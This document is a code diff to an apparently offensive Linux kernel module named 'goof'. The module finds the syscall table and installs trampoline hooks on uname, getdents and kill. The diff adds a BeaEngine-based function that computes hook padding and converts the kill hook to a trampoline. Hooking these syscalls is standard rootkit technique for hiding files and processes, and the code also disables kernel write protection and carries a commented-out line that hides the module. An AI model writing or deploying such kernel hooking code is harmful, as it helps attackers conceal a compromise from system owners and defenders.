@@ -8,7 +8,8 @@ Task:
 
 #include "goof.h"
 #include "user.h"
-
+#include <include/beaengine/BeaEngine.h>
+#include <beaengineSources/BeaEngine.c>
 
 
 // Iterate over the entire possible range until you find some __NR_close
@@ -384,6 +385,34 @@ void remove_tramp(unsigned int id ){
 	ENABLE_W_PROTECTED_MEMORY
 }
 
+/* @brief count the number of bytes required to pad the instruction safely 
+ *
+ * @param src the address of the syscall that is being evaluated. 
+ * 
+*/
+int number_of_bytes_to_pad_jump(unsigned char *src ){
+	int res = 0;
+	
+	DISASM MyDisasm;
+	int len = 0;
+	int Error = 0;
+
+	(void) memset(&MyDisasm, 0, sizeof(DISASM));
+	MyDisasm.EIP = src; 
+	for(int i = 0; i < 12 && res < HOOK_LEN ; i++){
+		len = Disasm(&MyDisasm);
+		printk("len: %d\n", len);
+		for(int j = 0; j < len; j++){
+			printk("%02x ", *(((unsigned char *)MyDisasm.EIP)+j));
+		}
+		res += len;
+		MyDisasm.EIP = MyDisasm.EIP + len;
+		
+		printk("\n");
+	}
+	return res;
+}
+
 //Defines the maximum number of hooks to be stored in the array
 #define HOOKS_COUNT 3
 
@@ -394,41 +423,56 @@ goof_init(void) {
 	//kobject_del(&THIS_MODULE->mkobj.kobj);
 
 	printk("[goof] module loaded\n");
-
+	
 	hooks = kmalloc(sizeof(struct Hook *)*HOOKS_COUNT, GFP_KERNEL);
 
 	//Find base syscall address	
 	__sys_call_table = find(); 
+	printk("Found table\n");
 
 	//Update table with hooked code
-	//Regular way to hook syscall
+	//Regular way to hook syscall:
 	//original_uname = __sys_call_table[__NR_uname];
-	//__sys_call_table[__NR_uname] = goofy_uname;
 
-	//Trampolining way to overwrite syscall  
-	create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, 16);
-	create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, 15);
+	//DISABLE_W_PROTECTED_MEMORY
+	//__sys_call_table[__NR_uname] = goofy_uname;
+	//ENABLE_W_PROTECTED_MEMORY
+
+
+	//Trampolining way to overwrite syscall:  
+	int padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_uname]);
+	printk("You will need to pad your hook to: %d bytes\n", padding_size);
+
+	create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, padding_size);
+	printk("Hooked uname\n\n");
+
+	padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_getdents]);
+	create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, padding_size);
+	printk("Hooked getdents\n\n");
 	
+	padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_kill]);
+	create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, padding_size);
+	printk("Hooked kill\n\n");
+
 	//Waiting on LDE+ to create these into trampoline hooks
 	//LDE+ needed  bto check if instruction is relative jump that needs to be decoded.
-	original_kill = __sys_call_table[__NR_kill];
+/*	original_kill = __sys_call_table[__NR_kill];
+
+	DISABLE_W_PROTECTED_MEMORY
 	__sys_call_table[__NR_kill] = goofy_kill;
+	ENABLE_W_PROTECTED_MEMORY
 
-	original_open = __sys_call_table[__NR_open];
-	__sys_call_table[__NR_open] = goofy_open;
+	printk("Hooked kill\n\n");
 
+	//original_open = __sys_call_table[__NR_open];
+	//__sys_call_table[__NR_open] = goofy_open;
+*/
 	//NO - waiting on an LDE @Scott Court
 	//create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, 16);
-	//Creating a new trampoline - DEBUG
 	
-	printk("[goof] DEBUG\n ");
-	unsigned char *ptr_tmp = (unsigned char *)__sys_call_table[__NR_kill];
-	for(int i = 0; i < 32; i++){
-		printk("%02x ", ptr_tmp[i]);
-	}
-	printk("\n");
 
-
+	//int padding_size = number_of_bytes_to_pad_jump(__sys_call_table[__NR_uname]);
+	//printk("You will need to pad your hook to: %d\n", padding_size);
 	return 0;
 }
 static void __exit
@@ -436,12 +480,15 @@ goof_exit(void) {
 
 	remove_tramp(0);
 	remove_tramp(1);
+	remove_tramp(2);
 
-
+/*
+	DISABLE_W_PROTECTED_MEMORY
 	__sys_call_table[__NR_kill] = original_kill;
-	__sys_call_table[__NR_open] = original_open;
+	__sys_call_table[__NR_uname] = original_uname;
+	ENABLE_W_PROTECTED_MEMORY
+*/	//__sys_call_table[__NR_open] = original_open;
 
-	//remove_tramp(2);
 	printk("[goof] module removed\n");
 	return;
 }
